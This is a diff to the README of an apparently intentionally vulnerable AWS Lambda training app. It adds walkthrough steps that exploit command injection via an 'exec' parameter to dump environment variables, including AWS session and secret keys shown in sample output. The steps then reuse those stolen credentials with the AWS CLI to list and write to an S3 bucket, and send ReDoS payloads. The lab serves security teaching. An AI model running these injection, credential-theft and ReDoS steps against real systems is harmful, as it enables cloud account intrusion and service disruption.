@@ -56,6 +56,8 @@ Very Vulnerable Lambda Application is a intentionally vulnerable application aim
 - Step 4: Deploy the app
 
     `sls deploy`
+    
+`Note: Incase want to run and test locally run sls wsgi serve`
 
 Wait for the function to deploy completely
 After running deploy, you should see output similar to:
@@ -140,12 +142,53 @@ x-amzn-RequestId: 43b9dd4a-f64b-42e0-ad5e-222209fde183
 - Step 11: change the request parameter to `exec=ls`:
 
     `http get https://<sls-endpoint>/dev/date?exec=ls -la`
+    
+- Step 12: change the request parameter to `exec=printenv`:
 
-- Step 12:  To test the redos attack vulnerability & check the response time:
+    `http get https://<sls-endpoint>/dev/date?exec=printenv`
+
+You will see an output like this	
+```
+HTTP/1.1 200 OK
+Connection: keep-alive
+Content-Length: 2117
+Content-Type: application/json
+Date: Tue, 03 Jan 2023 14:29:31 GMT
+Via: 1.1 2625470c3f9fce93fd4488fd43d6e9bc.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: QLZ8-jIrI7dVVROqPN8qrEGsMXaYx0keM4Lm6o-xZWarw2r2ypJiTw==
+X-Amz-Cf-Pop: DEL54-C3
+X-Amzn-Trace-Id: Root=1-63b43bcb-0026b5940af821c0221fef40;Sampled=0
+X-Cache: Miss from cloudfront
+x-amz-apigw-id: eK5HwE7CvHcFhDQ=
+x-amzn-Remapped-Content-Length: 2117
+x-amzn-RequestId: 24d2e182-d961-474e-9e89-8bef9a530d05
+
+{
+    "output": "AWS_LAMBDA_FUNCTION_VERSION=$LATEST\nAWS_SESSION_TOKEN=IQoJb3JpZ2luX2KotzFF4GLaajUG+JZbh3Na5s04zpmHHiFFXalH01bucEv7hgVJ9g==\nLD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\nLAMBDA_TASK_ROOT=/var/task\nAWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/vulnerable-lambda-dev-app\nAWS_LAMBDA_LOG_STREAM_NAME=2023/01/03/[$LATEST]ba63b5870c7148ba3246c23f7a\nAWS_LAMBDA_RUNTIME_API=127.0.0.1:9001\nAWS_EXECUTION_ENV=AWS_Lambda_python3.8\nAWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000\nAWS_LAMBDA_FUNCTION_NAME=vulnerable-lambda-dev-app\nPATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\nAWS_DEFAULT_REGION=us-west-2\nPWD=/var/task\nAWS_SECRET_ACCESS_KEY=d2DCHZFQ76i\nLAMBDA_RUNTIME_DIR=/var/runtime\nLANG=en_US.UTF-8\nAWS_LAMBDA_INITIALIZATION_TYPE=on-demand\nAWS_REGION=us-west-2\nTZ=:UTC\nAWS_ACCESS_KEY_ID=ASIA4B2\nSHLVL=1\n_AWS_XRAY_DAEMON_ADDRESS=169.251.79.129\n_AWS_XRAY_DAEMON_PORT=2000\nPYTHONPATH=/var/runtime\n_X_AMZN_TRACE_ID=Root=1-63b43bcb-0026baf821c0221fef40;Parent=6a23d6b63f;Sampled=0\nAWS_XRAY_CONTEXT_MISSING=LOG_ERROR\n_HANDLER=wsgi_handler.handler\nVARIABLE_1=supersecret99\nAWS_LAMBDA_FUNCTION_MEMORY_SIZE=1024\n_=/usr/bin/printenv\n"
+}
+```
+
+- Step 13: Now export the variable on the local and read the app.py code. Find out the name of the bucket:
+
+```
+export AWS_ACCESS_KEY_ID=
+export AWS_SECRET_ACCESS_KEY=
+export AWS_SESSION_TOKEN=
+```
+
+The run below mentioned commands, make sure aws cli is installed:
+
+```
+aws sts get-caller-identity
+aws s3 ls s3://<bucket-name>
+touch demo.txt ; aws s3 cp demo.txt s3://<bucket-name>
+```
+
+- Step 14:  To test the redos attack vulnerability & check the response time:
 	
     `http get https://<sls-endpoint>/dev/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab`
 
-- Step 12:  To exploit redos attack vulnerability, check the response time & it might show internal server error:
+- Step 15:  To exploit redos attack vulnerability, check the response time & it might show internal server error:
 	
     `http get https://<sls-endpoint>/dev/redos?string=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
  
